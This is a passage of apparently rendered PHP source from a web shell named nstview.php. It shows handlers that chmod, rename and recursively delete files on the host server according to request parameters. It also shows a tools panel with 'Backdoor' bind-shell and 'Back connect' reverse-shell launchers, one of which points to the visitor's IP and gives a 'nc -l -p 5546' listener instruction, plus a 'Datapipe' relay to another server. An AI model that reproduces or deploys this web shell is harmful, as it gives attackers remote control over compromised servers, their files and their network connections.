<span class="lineno">1181</span>                 <span class="o">&lt;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#ffffff&quot;</span><span class="o">&gt;&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;checkbox&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;owner4&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;4&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="s2">&quot;do_chmod(&#39;owner&#39;)&quot;</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno">1182</span>                 <span class="o">&lt;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#ffffff&quot;</span><span class="o">&gt;&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;checkbox&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;group4&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;4&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="s2">&quot;do_chmod(&#39;group&#39;)&quot;</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno">1183</span>                 <span class="o">&lt;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#ffffff&quot;</span><span class="o">&gt;&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;checkbox&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;other4&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;4&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="s2">&quot;do_chmod(&#39;other&#39;)&quot;</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno">1184</span>         <span class="o">&lt;/</span><span class="nx">tr</span><span class="o">&gt;&lt;</span><span class="nx">tr</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#dddddd&quot;</span><span class="o">&gt;</span>
<span class="lineno">1185</span>                 <span class="o">&lt;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;left&quot;</span> <span class="nx">nowrap</span><span class="o">&gt;&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">Write</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno">1186</span>                 <span class="o">&lt;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#ffffff&quot;</span><span class="o">&gt;&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;checkbox&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;owner2&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;2&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="s2">&quot;do_chmod(&#39;owner&#39;)&quot;</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno">1187</span>                 <span class="o">&lt;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#ffffff&quot;</span><span class="o">&gt;&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;checkbox&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;group2&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;2&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="s2">&quot;do_chmod(&#39;group&#39;)&quot;</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno">1188</span>                 <span class="o">&lt;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#ffffff&quot;</span><span class="o">&gt;&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;checkbox&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;other2&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;2&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="s2">&quot;do_chmod(&#39;other&#39;)&quot;</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno">1189</span>         <span class="o">&lt;/</span><span class="nx">tr</span><span class="o">&gt;&lt;</span><span class="nx">tr</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#dddddd&quot;</span><span class="o">&gt;</span>
<span class="lineno">1190</span>                 <span class="o">&lt;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;left&quot;</span> <span class="nx">nowrap</span><span class="o">&gt;&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">Execute</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno">1191</span>                 <span class="o">&lt;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#ffffff&quot;</span><span class="o">&gt;&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;checkbox&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;owner1&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="s2">&quot;do_chmod(&#39;owner&#39;)&quot;</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno">1192</span>                 <span class="o">&lt;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#ffffff&quot;</span><span class="o">&gt;&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;checkbox&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;group1&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="s2">&quot;do_chmod(&#39;group&#39;)&quot;</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno">1193</span>                 <span class="o">&lt;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#ffffff&quot;</span><span class="o">&gt;&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;checkbox&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;other1&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="s2">&quot;do_chmod(&#39;other&#39;)&quot;</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno">1194</span>         <span class="o">&lt;/</span><span class="nx">tr</span><span class="o">&gt;&lt;</span><span class="nx">tr</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#dddddd&quot;</span><span class="o">&gt;</span>
<span class="lineno">1195</span>                 <span class="o">&lt;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;right&quot;</span> <span class="nx">nowrap</span><span class="o">&gt;</span><span class="nx">Octal</span><span class="o">:&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno">1196</span>                 <span class="o">&lt;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span><span class="o">&gt;&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;t_owner&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="nx">size</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno">1197</span>                 <span class="o">&lt;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span><span class="o">&gt;&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;t_group&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="nx">size</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno">1198</span>                 <span class="o">&lt;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span><span class="o">&gt;&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;t_other&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="nx">size</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno">1199</span>                 <span class="o">&lt;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;left&quot;</span><span class="o">&gt;&lt;</span><span class="nx">b</span><span class="o">&gt;=&lt;/</span><span class="nx">b</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;t_total&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;777&quot;</span> <span class="nx">size</span><span class="o">=</span><span class="s2">&quot;3&quot;</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno">1200</span>         <span class="o">&lt;/</span><span class="nx">tr</span><span class="o">&gt;&lt;</span><span class="nx">tr</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#dddddd&quot;</span><span class="o">&gt;</span>
<span class="lineno">1201</span>                 <span class="o">&lt;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;right&quot;</span> <span class="nx">nowrap</span><span class="o">&gt;</span><span class="nx">Symbolic</span><span class="o">:&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno">1202</span>                 <span class="o">&lt;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span><span class="o">&gt;&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;sym_owner&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="nx">size</span><span class="o">=</span><span class="s2">&quot;3&quot;</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno">1203</span>                 <span class="o">&lt;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span><span class="o">&gt;&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;sym_group&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="nx">size</span><span class="o">=</span><span class="s2">&quot;3&quot;</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno">1204</span>                 <span class="o">&lt;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span><span class="o">&gt;&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;sym_other&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="nx">size</span><span class="o">=</span><span class="s2">&quot;3&quot;</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno">1205</span>                 <span class="o">&lt;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;left&quot;</span> <span class="nx">width</span><span class="o">=</span><span class="mi">100</span><span class="o">&gt;&lt;</span><span class="nx">b</span><span class="o">&gt;=&lt;/</span><span class="nx">b</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;sym_total&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="nx">size</span><span class="o">=</span><span class="s2">&quot;10&quot;</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno">1206</span>         <span class="o">&lt;/</span><span class="nx">tr</span><span class="o">&gt;</span>
<span class="lineno">1207</span> <span class="o">&lt;/</span><span class="nx">table</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;&lt;/</span><span class="nx">tr</span><span class="o">&gt;&lt;/</span><span class="nx">table</span><span class="o">&gt;&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
<span class="lineno">1208</span> <span class="nx">HTML</span><span class="p">;</span>
<span class="lineno">1209</span> 
<span class="lineno">1210</span> <span class="k">print</span> <span class="s2">&quot;&lt;center&gt;&quot;</span><span class="o">.</span><span class="nv">$chmd</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="lineno">1211</span> 
<span class="lineno">1212</span> <span class="s2">&lt;b&gt;</span><span class="si">$d</span><span class="s2">/</span><span class="si">$wich_f</span><span class="s2">&lt;/b&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="lineno">1213</span> <span class="s2">&lt;input type=submit value=CHMOD&gt;&lt;/form&gt;</span>
<span class="lineno">1214</span> <span class="s2">&lt;/center&gt;</span>
<span class="lineno">1215</span> <span class="s2">&lt;/form&gt;</span>
<span class="lineno">1216</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1217</span> <span class="nv">$t_total</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;t_total&#39;</span><span class="p">];</span>
<span class="lineno">1218</span> <span class="k">if</span><span class="p">(</span><span class="nv">$t_total</span><span class="p">){</span>
<span class="lineno">1219</span> <span class="nb">chmod</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$wich_f</span><span class="p">,</span><span class="nv">$t_total</span><span class="p">);</span>
<span class="lineno">1220</span> <span class="k">print</span> <span class="s2">&quot;&lt;center&gt;&lt;font color=green&gt;&lt;br&gt;&lt;b&gt;Now chmod is </span><span class="si">$t_total</span><span class="s2">&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;/font&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1221</span> <span class="k">print</span> <span class="s2">&quot;&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&#39;&gt;# BACK&lt;/a&gt;&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1222</span> <span class="p">}</span>
<span class="lineno">1223</span> <span class="k">echo</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="lineno">1224</span> <span class="k">exit</span><span class="p">;</span>
<span class="lineno">1225</span> <span class="p">}</span>
<span class="lineno">1226</span> 
<span class="lineno">1227</span> <span class="c1"># rename</span>
<span class="lineno">1228</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;rename&#39;</span><span class="p">]){</span>
<span class="lineno">1229</span> <span class="k">print</span> <span class="s2">&quot;&lt;b&gt;&lt;font color=green&gt;RENAME </span><span class="si">$d</span><span class="s2">/</span><span class="si">$wich_f</span><span class="s2"> ?&lt;/b&gt;&lt;/font&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="lineno">1230</span> <span class="s2">&lt;center&gt;</span>
<span class="lineno">1231</span> <span class="s2">&lt;form method=post&gt;</span>
<span class="lineno">1232</span> <span class="s2">&lt;b&gt;RENAME&lt;/b&gt;&lt;br&gt;&lt;u&gt;</span><span class="si">$wich_f</span><span class="s2">&lt;/u&gt;&lt;br&gt;&lt;Br&gt;&lt;B&gt;TO&lt;/B&gt;&lt;br&gt;</span>
<span class="lineno">1233</span> <span class="s2">&lt;input name=rto size=40 value=&#39;</span><span class="si">$wich_f</span><span class="s2">&#39;&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="lineno">1234</span> <span class="s2">&lt;input type=submit value=RENAME&gt;</span>
<span class="lineno">1235</span> <span class="s2">&lt;/form&gt;</span>
<span class="lineno">1236</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1237</span> 
<span class="lineno">1238</span> <span class="o">@</span><span class="nv">$rto</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;rto&#39;</span><span class="p">];</span>
<span class="lineno">1239</span> 
<span class="lineno">1240</span> <span class="k">if</span><span class="p">(</span><span class="nv">$rto</span><span class="p">){</span>
<span class="lineno">1241</span> <span class="nv">$fr1</span><span class="o">=</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$wich_f</span><span class="p">;</span>
<span class="lineno">1242</span> <span class="nv">$fr1</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;//&quot;</span><span class="p">,</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="nv">$fr1</span><span class="p">);</span>
<span class="lineno">1243</span> <span class="nv">$to1</span><span class="o">=</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$rto</span><span class="p">;</span>
<span class="lineno">1244</span> <span class="nv">$to1</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;//&quot;</span><span class="p">,</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="nv">$to1</span><span class="p">);</span>
<span class="lineno">1245</span> 
<span class="lineno">1246</span> <span class="nb">rename</span><span class="p">(</span><span class="nv">$fr1</span><span class="p">,</span><span class="nv">$to1</span><span class="p">);</span>
<span class="lineno">1247</span> <span class="k">print</span> <span class="s2">&quot;File &lt;br&gt;&lt;b&gt;</span><span class="si">$wich_f</span><span class="s2">&lt;/b&gt;&lt;br&gt;Renamed to &lt;b&gt;</span><span class="si">$rto</span><span class="s2">&lt;/b&gt;&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1248</span> 
<span class="lineno">1249</span> <span class="k">echo</span> <span class="s2">&quot;&lt;meta http-equiv=</span><span class="se">\&quot;</span><span class="s2">REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">3;URL=&quot;</span><span class="o">.</span><span class="nv">$php_self</span><span class="o">.</span><span class="s2">&quot;?d=&quot;</span><span class="o">.</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;&amp;rename=1&amp;wich_f=&quot;</span><span class="o">.</span><span class="nv">$rto</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1250</span> 
<span class="lineno">1251</span> <span class="p">}</span>
<span class="lineno">1252</span> 
<span class="lineno">1253</span> <span class="k">echo</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="lineno">1254</span> <span class="k">exit</span><span class="p">;</span>
<span class="lineno">1255</span> <span class="p">}</span>
<span class="lineno">1256</span> 
<span class="lineno">1257</span> 
<span class="lineno">1258</span> 
<span class="lineno">1259</span> 
<span class="lineno">1260</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;deldir&#39;</span><span class="p">]){</span>
<span class="lineno">1261</span> <span class="o">@</span><span class="nv">$dir</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">];</span>
<span class="lineno">1262</span> <span class="k">function</span> <span class="nf">deldir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)</span>
<span class="lineno">1263</span> <span class="p">{</span>
<span class="lineno">1264</span> <span class="nv">$handle</span> <span class="o">=</span> <span class="o">@</span><span class="nb">opendir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
<span class="lineno">1265</span> <span class="k">while</span> <span class="p">(</span><span class="k">false</span><span class="o">!==</span><span class="p">(</span><span class="nv">$ff</span> <span class="o">=</span> <span class="o">@</span><span class="nb">readdir</span><span class="p">(</span><span class="nv">$handle</span><span class="p">))){</span>
<span class="lineno">1266</span> <span class="k">if</span><span class="p">(</span><span class="nv">$ff</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span> <span class="o">&amp;&amp;</span> <span class="nv">$ff</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">){</span>
<span class="lineno">1267</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">is_dir</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$dir</span><span class="s2">/</span><span class="si">$ff</span><span class="s2">&quot;</span><span class="p">)){</span>
<span class="lineno">1268</span> <span class="nx">deldir</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$dir</span><span class="s2">/</span><span class="si">$ff</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">1269</span> <span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="lineno">1270</span> <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$dir</span><span class="s2">/</span><span class="si">$ff</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">1271</span> <span class="p">}}}</span>
<span class="lineno">1272</span> <span class="o">@</span><span class="nb">closedir</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
<span class="lineno">1273</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">rmdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)){</span>
<span class="lineno">1274</span> <span class="o">@</span><span class="nv">$success</span> <span class="o">=</span> <span class="k">true</span><span class="p">;}</span>
<span class="lineno">1275</span> <span class="k">return</span> <span class="o">@</span><span class="nv">$success</span><span class="p">;</span>
<span class="lineno">1276</span> <span class="p">}</span>
<span class="lineno">1277</span> <span class="nv">$dir</span><span class="o">=@</span><span class="nv">$dir</span><span class="p">;</span>
<span class="lineno">1278</span> <span class="nx">deldir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
<span class="lineno">1279</span> 
<span class="lineno">1280</span> <span class="nv">$rback</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;rback&#39;</span><span class="p">];</span>
<span class="lineno">1281</span> <span class="o">@</span><span class="nv">$rback</span><span class="o">=</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="nv">$rback</span><span class="p">);</span>
<span class="lineno">1282</span> <span class="nv">$crb</span><span class="o">=</span><span class="nb">count</span><span class="p">(</span><span class="nv">$rback</span><span class="p">);</span>
<span class="lineno">1283</span> <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&lt;</span><span class="nv">$crb</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
<span class="lineno">1284</span>         <span class="o">@</span><span class="nv">$x</span><span class="o">.=</span><span class="nv">$rback</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="p">;</span>
<span class="lineno">1285</span> <span class="p">}</span>
<span class="lineno">1286</span> <span class="k">echo</span> <span class="s2">&quot;&lt;meta http-equiv=</span><span class="se">\&quot;</span><span class="s2">REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">0;URL=&#39;</span><span class="si">$php_self</span><span class="s2">?d=&quot;</span><span class="o">.@</span><span class="nv">$x</span><span class="o">.</span><span class="s2">&quot;&#39;</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1287</span> <span class="k">echo</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="lineno">1288</span> <span class="k">exit</span><span class="p">;}</span>
<span class="lineno">1289</span> 
<span class="lineno">1290</span> 
<span class="lineno">1291</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;t&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;tools&quot;</span><span class="p">){</span>
<span class="lineno">1292</span>         <span class="c1"># unix</span>
<span class="lineno">1293</span> <span class="k">if</span><span class="p">(</span><span class="nv">$os</span><span class="o">==</span><span class="s2">&quot;unix&quot;</span><span class="p">){</span>
<span class="lineno">1294</span> <span class="k">print</span> <span class="s2">&quot;</span>
<span class="lineno">1295</span> <span class="s2">&lt;center&gt;&lt;br&gt;</span>
<span class="lineno">1296</span> <span class="s2">&lt;font color=red&gt;&lt;b&gt;P.S: After you Start, your browser may stuck! You must close it, and then run nstview.php again.&lt;/b&gt;&lt;br&gt;&lt;/font&gt;</span>
<span class="lineno">1297</span> <span class="s2">&lt;table border=1&gt;</span>
<span class="lineno">1298</span> <span class="s2">&lt;tr&gt;&lt;td align=center&gt;&lt;b&gt;[Name]&lt;/td&gt;&lt;td align=center&gt;&lt;b&gt;[C]&lt;/td&gt;&lt;td align=center&gt;&lt;b&gt;[Port]&lt;/td&gt;&lt;td align=center&gt;&lt;b&gt;[Perl]&lt;/td&gt;&lt;td align=center&gt;&lt;b&gt;[Port]&lt;/td&gt;&lt;td align=center&gt;&lt;b&gt;[Other options, info]&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1299</span> <span class="s2">&lt;tr&gt;&lt;form method=post&gt;&lt;td&gt;&lt;font color=red&gt;&lt;b&gt;Backdoor:&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit name=c_bd value=&#39;Start&#39; style=&#39;background-color:green;&#39;&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port size=6 value=5545&gt;&lt;/td&gt;&lt;/form&gt;&lt;form method=post&gt;&lt;td&gt;&lt;input type=submit name=perl_bd value=&#39;Start&#39; style=&#39;background-color:green;&#39;&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port value=5551 size=6&gt;&lt;/td&gt;&lt;td&gt;none&lt;/td&gt;&lt;/form&gt;&lt;/tr&gt;</span>
<span class="lineno">1300</span> <span class="s2">&lt;tr&gt;&lt;form method=post&gt;&lt;td&gt;&lt;font color=red&gt;&lt;b&gt;Back connect:&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value=&#39;Start&#39; name=bc_c style=&#39;background-color:green;&#39;&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port_c size=6 value=5546&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value=&#39;Start&#39; name=port_p disabled style=&#39;background-color:gray;&#39;&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port value=5552 size=6&gt;&lt;/td&gt;&lt;td&gt;b.c. ip: &lt;input name=ip value=&#39;&quot;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;&gt; nc -l -p &lt;i&gt;5546&lt;/i&gt;&lt;/td&gt;&lt;/form&gt;&lt;/tr&gt;</span>
<span class="lineno">1301</span> <span class="s2">&lt;tr&gt;&lt;form method=post&gt;&lt;td&gt;&lt;font color=red&gt;&lt;b&gt;Datapipe:&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value=&#39;Start&#39; disabled style=&#39;background-color:gray;&#39;&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port_1 size=6 value=5547&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value=&#39;Start&#39; name=datapipe_pl style=&#39;background-color:green;&#39;&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port_2 value=5553 size=6&gt;&lt;/td&gt;&lt;td&gt;other serv ip: &lt;input name=ip&gt; port: &lt;input name=port_3 value=5051 size=6&gt;&lt;/td&gt;&lt;/form&gt;&lt;/tr&gt;</span>
